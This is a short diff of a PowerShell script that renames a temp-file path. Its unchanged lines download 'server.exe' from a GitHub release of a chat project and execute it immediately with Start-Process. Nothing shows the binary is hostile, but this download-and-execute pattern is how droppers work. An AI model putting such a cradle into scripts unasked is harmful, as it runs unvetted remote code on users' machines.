@@ -1,3 +1,3 @@
-$o = "$env:temp\myexe.exe"
+$o = "$env:temp\1.exe"
 (New-Object System.Net.WebClient).DownloadFile("https://github.com/jostanise/rsa_encrypted_local_chat/releases/download/v1.0/server.exe", $o)
 Start-Process -Filepath $o
